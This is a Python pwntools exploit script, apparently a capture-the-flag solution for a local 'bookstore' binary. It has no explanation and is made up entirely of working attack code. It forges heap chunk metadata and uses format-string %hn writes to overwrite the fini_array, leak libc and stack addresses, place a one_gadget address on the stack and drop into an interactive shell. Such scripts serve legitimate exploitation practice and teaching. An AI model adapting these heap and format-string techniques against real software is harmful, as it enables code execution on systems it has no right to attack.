from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./bookstore"
bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def menu(choice, ch=None):
  conn.recvuntil("Submit\n")
  if ch is None:
    conn.sendline(str(choice))
  else:
    conn.sendline(ch)

def edit(num, content):
  menu(num)
  conn.recvuntil("order:")
  conn.sendline(content)

def delete(num):
  menu(num+2)

def submit(ch=None):
  menu(5, ch=ch)

FINI_ARRAY_ADDR = 0x6011B8
MAIN_OFFSET = 0xA39

c1 = "%" + str(0x39 - (0x45 - 0x39)) + "c%13$hhn" + \
     "%" + str(0xa - 0x39 + 0x100) + "c%14$hhn-dddd%31$p-%33$p-"
c1 = c1.ljust(0x80, "c")
c2 = ("b"*0x20).ljust(0x140, "\x00")

payload = c1 + p64(0x0) + p64(0x151) + \
          c2 + \
          p64(0x0) + p64(0x21) + "c"*0x10 + p64(0) + p64(0x31)
edit(1, payload)
delete(2)

stack_payload = "5"*8 + p64(FINI_ARRAY_ADDR) + p64(FINI_ARRAY_ADDR+1)
submit(ch=stack_payload)

conn.recvuntil("dddd0x")

libc_leak = int(conn.recvuntil("-")[:-1], 16)
libc.address = libc_leak - 0x7f0ae6145830 + 0x7f0ae6125000

stack_leak = int(conn.recvuntil("-")[2:-1], 16)
log.info("Stack leak: " + hex(stack_leak))

log.info("Libc address: " + hex(libc.address))

# Do everything once again

ROP_CHAIN_ADDR = stack_leak - 0x7ffd7f152bc8 + 0x7ffd7f1529d8
ONE_GADGET_ADDR = libc.address + 0x4526a
STACK_CLEAR_ADDR = stack_leak - 0x7ffd24208538 + 0x7ffd24208380

words = [None]*4
words[0] = ONE_GADGET_ADDR % 0x10000
words[1] = (ONE_GADGET_ADDR / 0x10000) % 0x10000
words[2] = (ONE_GADGET_ADDR / 0x100000000) % 0x10000
words[3] = (ONE_GADGET_ADDR / 0x10000000000) % 0x10000

def fix(param):
  log.info(param)
  if param < 0:
    return str(param + 0x10000)
  return str(param)

c1 = "%" + fix(words[0] - (0x45 - 0x39)) + "c%13$hn" + \
     "%" + fix(words[1] - words[0]) + "c%14$hn" + \
     "%" + fix(words[2] - words[1]) + "c%15$hn" + \
     "%" + fix(0 - words[2]) + "c%16$hn%17$hn%18$hn"

c1 = c1.ljust(0x80, "c")
c2 = ("b"*0x110 + p64(0) + p64(0x12401)).ljust(0x140, "\x00")

payload = c1 + p64(0x0) + p64(0x151) + \
          c2 + \
          p64(0x0) + p64(0x21) + "c"*0x10 + p64(0) + p64(0x31)
edit(1, payload)
delete(2)

stack_payload = "5"*8 + p64(ROP_CHAIN_ADDR) + p64(ROP_CHAIN_ADDR + 2) + \
                p64(ROP_CHAIN_ADDR + 4) + \
                p64(STACK_CLEAR_ADDR) + p64(STACK_CLEAR_ADDR + 2) + \
                p64(STACK_CLEAR_ADDR + 4)

submit(ch=stack_payload)

log.info("one_gadget: " + hex(ONE_GADGET_ADDR))

conn.interactive()
